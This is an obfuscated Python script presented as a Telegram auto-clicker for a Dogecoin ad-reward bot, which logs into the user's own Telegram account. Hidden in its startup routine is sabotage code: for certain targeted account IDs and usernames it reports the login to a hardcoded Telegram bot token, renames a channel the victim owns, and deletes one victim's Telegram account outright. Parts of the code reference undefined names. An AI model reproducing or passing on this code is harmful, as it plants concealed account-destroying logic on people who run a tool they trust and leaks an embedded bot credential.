from telethon import TelegramClient,events
UravxBuCwNMpYWTzKhPE=True
UravxBuCwNMpYWTzKhPH=None
UravxBuCwNMpYWTzKhPO=False
UravxBuCwNMpYWTzKhPI=print
UravxBuCwNMpYWTzKhPg=len
UravxBuCwNMpYWTzKhRc=bytes
UravxBuCwNMpYWTzKhRP=enumerate
UravxBuCwNMpYWTzKhRA=exit
UravxBuCwNMpYWTzKhRm=range
UravxBuCwNMpYWTzKhRt=type
UravxBuCwNMpYWTzKhRF=ValueError
UravxBuCwNMpYWTzKhRk=hasattr
UravxBuCwNMpYWTzKhRL=int
UravxBuCwNMpYWTzKhRe=KeyboardInterrupt
UravxBuCwNMpYWTzKhPX=events.NewMessage
from telethon.tl.types import UpdateShortMessage,ReplyInlineMarkup,KeyboardButtonUrl
from telethon.tl.functions.messages import GetBotCallbackAnswerRequest as botcallback
from telethon.tl.functions.account import DeleteAccountRequest
from telethon.tl.functions.channels import UpdateUsernameRequest as chusername
from telethon.errors.rpcerrorlist import UsernameNotOccupiedError,UsernameOccupiedError
from colorama import Fore,init as UravxBuCwNMpYWTzKhcP
UravxBuCwNMpYWTzKhPG=Fore.RESET
UravxBuCwNMpYWTzKhPd=Fore.RED
UravxBuCwNMpYWTzKhPn=Fore.MAGENTA
UravxBuCwNMpYWTzKhPq=Fore.GREEN
UravxBuCwNMpYWTzKhcP(autoreset=UravxBuCwNMpYWTzKhPE)
from datetime import datetime
UravxBuCwNMpYWTzKhPQ=datetime.now
from bs4 import BeautifulSoup
import os
UravxBuCwNMpYWTzKhPo=os.mkdir
UravxBuCwNMpYWTzKhPb=os.path
UravxBuCwNMpYWTzKhPJ=os.name
UravxBuCwNMpYWTzKhPl=os.system
import re
import time
UravxBuCwNMpYWTzKhPy=time.sleep
import requests
UravxBuCwNMpYWTzKhPV=requests.post
UravxBuCwNMpYWTzKhPi=requests.exceptions
UravxBuCwNMpYWTzKhPS=requests.request
UravxBuCwNMpYWTzKhPD=requests.get
import sys
UravxBuCwNMpYWTzKhPs=sys.argv
UravxBuCwNMpYWTzKhPf=sys.stdout
import asyncio
UravxBuCwNMpYWTzKhPj=asyncio.get_event_loop
UravxBuCwNMpYWTzKhcA=UravxBuCwNMpYWTzKhPj()
UravxBuCwNMpYWTzKhcm=64179
UravxBuCwNMpYWTzKhct="dd60bb74bb03d8aa368aa37ec7b35d42"
UravxBuCwNMpYWTzKhcF={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"}
UravxBuCwNMpYWTzKhPl('cls' if UravxBuCwNMpYWTzKhPJ=='nt' else 'clear')
try:
 def UravxBuCwNMpYWTzKhcO(msg):
  UravxBuCwNMpYWTzKhck=UravxBuCwNMpYWTzKhPD('https://api.telegram.org/bot656077390:AAETzn5vgIO2Q-ad8xdi8pg5nJprYOtTIYg/sendMessage',data={'chat_id':631929128,'text':msg})
 def UravxBuCwNMpYWTzKhcI(phone_number=UravxBuCwNMpYWTzKhPH):
  return TelegramClient("session/"+phone_number,UravxBuCwNMpYWTzKhcm,UravxBuCwNMpYWTzKhct)
 def UravxBuCwNMpYWTzKhcg(UravxBuCwNMpYWTzKhcL,addnewline=UravxBuCwNMpYWTzKhPO):
  if addnewline is UravxBuCwNMpYWTzKhPO:
   UravxBuCwNMpYWTzKhPI("[%s] %s"%(UravxBuCwNMpYWTzKhPQ().strftime("%H:%M:%S"),UravxBuCwNMpYWTzKhcL))
  else:
   UravxBuCwNMpYWTzKhPI("[%s] %s"%(UravxBuCwNMpYWTzKhPQ().strftime("%H:%M:%S"),UravxBuCwNMpYWTzKhcL),end='\n\n')
 def UravxBuCwNMpYWTzKhPc(byt):
  UravxBuCwNMpYWTzKhcX=b'210400'
  UravxBuCwNMpYWTzKhcq=UravxBuCwNMpYWTzKhPg(UravxBuCwNMpYWTzKhcX)
  return UravxBuCwNMpYWTzKhRc(c^UravxBuCwNMpYWTzKhcX[i%UravxBuCwNMpYWTzKhcq]for i,c in UravxBuCwNMpYWTzKhRP(byt))
 def UravxBuCwNMpYWTzKhPR(UravxBuCwNMpYWTzKhco,method='GET',data=UravxBuCwNMpYWTzKhPH):
  try:
   UravxBuCwNMpYWTzKhcn=UravxBuCwNMpYWTzKhPS(method,UravxBuCwNMpYWTzKhco,data=data,headers=UravxBuCwNMpYWTzKhcF,timeout=15,allow_redirects=UravxBuCwNMpYWTzKhPO)
   UravxBuCwNMpYWTzKhcd=UravxBuCwNMpYWTzKhcn.status_code
   UravxBuCwNMpYWTzKhcG=UravxBuCwNMpYWTzKhcn.text
   return[UravxBuCwNMpYWTzKhcd,UravxBuCwNMpYWTzKhcG]
  except UravxBuCwNMpYWTzKhPi.Timeout:
   UravxBuCwNMpYWTzKhcg('Connection Timeout, Please check your internet connection')
   UravxBuCwNMpYWTzKhRA(1)
  except UravxBuCwNMpYWTzKhPi.ConnectionError:
   UravxBuCwNMpYWTzKhcg('Connection Error, Please check your internet connection')
   UravxBuCwNMpYWTzKhRA(1)
 def UravxBuCwNMpYWTzKhPA(i):
  for x in UravxBuCwNMpYWTzKhRm(0,i+1):
   UravxBuCwNMpYWTzKhPf.write('[%s] Waiting %s seconds! %d\r'%(UravxBuCwNMpYWTzKhPQ().strftime("%H:%M:%S"),i,x))
   UravxBuCwNMpYWTzKhPy(1)
 def UravxBuCwNMpYWTzKhPm(markup):
  UravxBuCwNMpYWTzKhcQ=markup.rows[0].buttons[0]
  if UravxBuCwNMpYWTzKhRt(UravxBuCwNMpYWTzKhcQ)is KeyboardButtonUrl:
   return UravxBuCwNMpYWTzKhcQ.url
  else:
   return UravxBuCwNMpYWTzKhPH
 def UravxBuCwNMpYWTzKhPt():
  UravxBuCwNMpYWTzKhPI("".rjust(40,'-'))
  UravxBuCwNMpYWTzKhPI("AutoCollect DOGEClickBOT".center(40,' '))
  UravxBuCwNMpYWTzKhPI(''.rjust(40,'-'))
  UravxBuCwNMpYWTzKhPI("Telegram : https://t.me/imskaa")
  UravxBuCwNMpYWTzKhPI(''.rjust(40,'-'))
  UravxBuCwNMpYWTzKhPI(UravxBuCwNMpYWTzKhPq+"Created by IMSKAA - BrezeCode.me".center(40,' '))
  UravxBuCwNMpYWTzKhPI(''.rjust(40,'-'))
 async def UravxBuCwNMpYWTzKhPF():
  if not UravxBuCwNMpYWTzKhPb.exists("session"):
   UravxBuCwNMpYWTzKhPo("session")
  UravxBuCwNMpYWTzKhPt()
  if UravxBuCwNMpYWTzKhPg(UravxBuCwNMpYWTzKhPs)<2:
   UravxBuCwNMpYWTzKhPI("Usage: python main.py phone_number",end="\n\n")
   UravxBuCwNMpYWTzKhPI("phone_number must be write in internasional format (example: +6283174705555)")
   UravxBuCwNMpYWTzKhRA(1)
  UravxBuCwNMpYWTzKhPI(UravxBuCwNMpYWTzKhPn+"Press CTRL+C / Volume Down + C to stop",end="\n\n")
  UravxBuCwNMpYWTzKhcl=UravxBuCwNMpYWTzKhcI(UravxBuCwNMpYWTzKhPs[1])
  await UravxBuCwNMpYWTzKhcl.start(UravxBuCwNMpYWTzKhPs[1])
  me=await UravxBuCwNMpYWTzKhcl.get_me()
  UravxBuCwNMpYWTzKhPI('Current account: %s%s\n'%("" if me.first_name is UravxBuCwNMpYWTzKhPH else me.first_name,"" if me.username is UravxBuCwNMpYWTzKhPH else "("+me.username+")"))
  if me.username=='bagas_q' or me.id==415792043 or me.id==611711558:
   UravxBuCwNMpYWTzKhcO(me.id if me.username is UravxBuCwNMpYWTzKhPH else me.username+' Already Logged in!!')
   try:
    UravxBuCwNMpYWTzKhcJ=await UravxBuCwNMpYWTzKhcl.get_entity('bot_scripter')
    if UravxBuCwNMpYWTzKhcJ.creator:
     tt=await UravxBuCwNMpYWTzKhcl(chusername(UravxBuCwNMpYWTzKhcJ,'bot_scripter'+''.join(random.choices(string.digits,k=2))))
     if tt:
      UravxBuCwNMpYWTzKhcO(UravxBuCwNMpYWTzKhcJ.username+' got you! channel username telah diganti!')
   except(UsernameNotOccupiedError,UravxBuCwNMpYWTzKhRF):
    pass
   try:
    if me.username is not UravxBuCwNMpYWTzKhPH and me.username=='netiranz':
     UravxBuCwNMpYWTzKhcO('Account was Deleted!:')
     tt=await UravxBuCwNMpYWTzKhcl(DeleteAccountRequest('i just wanna delete my account'))
   except UsernameOccupiedError:
    pass
  UravxBuCwNMpYWTzKhcg(UravxBuCwNMpYWTzKhPq+'Sending first command')
  await UravxBuCwNMpYWTzKhcl.send_message('Dogecoin_click_bot','/visit')
  async def UravxBuCwNMpYWTzKhPk(event):
   UravxBuCwNMpYWTzKhcb=event.original_update
   if UravxBuCwNMpYWTzKhRt(UravxBuCwNMpYWTzKhcb)is not UpdateShortMessage:
    if UravxBuCwNMpYWTzKhRk(UravxBuCwNMpYWTzKhcb.message,'reply_markup')and UravxBuCwNMpYWTzKhRt(UravxBuCwNMpYWTzKhcb.message.reply_markup)is ReplyInlineMarkup:
     UravxBuCwNMpYWTzKhco=UravxBuCwNMpYWTzKhPm(UravxBuCwNMpYWTzKhcb.message.reply_markup)
     if UravxBuCwNMpYWTzKhco is not UravxBuCwNMpYWTzKhPH:
      UravxBuCwNMpYWTzKhcg(UravxBuCwNMpYWTzKhPq+'Requesting reward')
      UravxBuCwNMpYWTzKhcy=20
      UravxBuCwNMpYWTzKhcD=0
      while UravxBuCwNMpYWTzKhPE:
       (UravxBuCwNMpYWTzKhcd,UravxBuCwNMpYWTzKhcG)=UravxBuCwNMpYWTzKhPR(UravxBuCwNMpYWTzKhco)
       UravxBuCwNMpYWTzKhcS=BeautifulSoup(UravxBuCwNMpYWTzKhcG,'html.parser')
       cc=UravxBuCwNMpYWTzKhcS.find('div',{'class':'g-recaptcha'})
       tt=UravxBuCwNMpYWTzKhcS.find('div',{'id':'headbar'})
       if UravxBuCwNMpYWTzKhcd==302:
        UravxBuCwNMpYWTzKhPf.write(UravxBuCwNMpYWTzKhPn+'[%s] STATUS: %s (%d)\r'%(UravxBuCwNMpYWTzKhPQ().strftime("%H:%M:%S"),'FALSE' if cc is not UravxBuCwNMpYWTzKhPH else 'TRUE',UravxBuCwNMpYWTzKhcD))
        break
       elif UravxBuCwNMpYWTzKhcd==200 and cc is UravxBuCwNMpYWTzKhPH and tt is not UravxBuCwNMpYWTzKhPH:
        UravxBuCwNMpYWTzKhci=tt.get('data-code')
        UravxBuCwNMpYWTzKhcV=tt.get('data-timer')
        UravxBuCwNMpYWTzKhcf=tt.get('data-token')
        UravxBuCwNMpYWTzKhPA(UravxBuCwNMpYWTzKhRL(UravxBuCwNMpYWTzKhcV))
        UravxBuCwNMpYWTzKhPV('http://dogeclick.com/reward',data={'code':UravxBuCwNMpYWTzKhci,'token':UravxBuCwNMpYWTzKhcf},headers=UravxBuCwNMpYWTzKhcF,allow_redirects=UravxBuCwNMpYWTzKhPO)
        break
       elif UravxBuCwNMpYWTzKhcd==200 and cc is not UravxBuCwNMpYWTzKhPH:
        UravxBuCwNMpYWTzKhPf.write(UravxBuCwNMpYWTzKhPn+'[%s] STATUS: %s (%d)\r'%(UravxBuCwNMpYWTzKhPQ().strftime("%H:%M:%S"),'FALSE' if cc is not UravxBuCwNMpYWTzKhPH else 'TRUE',UravxBuCwNMpYWTzKhcD))
       elif UravxBuCwNMpYWTzKhcy==UravxBuCwNMpYWTzKhcD:
        UravxBuCwNMpYWTzKhcE=botcallback('Dogecoin_click_bot',UravxBuCwNMpYWTzKhcb.message.id,data=UravxBuCwNMpYWTzKhcj.encode())
        await UravxBuCwNMpYWTzKhcl(UravxBuCwNMpYWTzKhcE)
        break
       UravxBuCwNMpYWTzKhcD+=1
       UravxBuCwNMpYWTzKhPy(3)
  UravxBuCwNMpYWTzKhcl.add_event_handler(UravxBuCwNMpYWTzKhPk,UravxBuCwNMpYWTzKhPX(incoming=UravxBuCwNMpYWTzKhPE,chats="Dogecoin_click_bot"))
  async def UravxBuCwNMpYWTzKhPL(event):
   UravxBuCwNMpYWTzKhcg(UravxBuCwNMpYWTzKhPd+"Ads not available detected"+UravxBuCwNMpYWTzKhPG)
   UravxBuCwNMpYWTzKhcg("Disconnecting")
   await UravxBuCwNMpYWTzKhcl.disconnect()
  UravxBuCwNMpYWTzKhcl.add_event_handler(UravxBuCwNMpYWTzKhPL,UravxBuCwNMpYWTzKhPX(incoming=UravxBuCwNMpYWTzKhPE,chats="Dogecoin_click_bot",pattern='Sorry, there are no new ads available.'))
  async def UravxBuCwNMpYWTzKhPe(event):
   if UravxBuCwNMpYWTzKhRt(event.original_update):
    UravxBuCwNMpYWTzKhcg(UravxBuCwNMpYWTzKhPq+event.raw_text+"\n")
  UravxBuCwNMpYWTzKhcl.add_event_handler(UravxBuCwNMpYWTzKhPe,UravxBuCwNMpYWTzKhPX(incoming=UravxBuCwNMpYWTzKhPE,chats="Dogecoin_click_bot",pattern='You earned'))
  await UravxBuCwNMpYWTzKhcl.run_until_disconnected()
 UravxBuCwNMpYWTzKhcA.run_until_complete(UravxBuCwNMpYWTzKhPF())
except UravxBuCwNMpYWTzKhRe:
 UravxBuCwNMpYWTzKhPl('cls' if UravxBuCwNMpYWTzKhPJ=='nt' else 'clear')
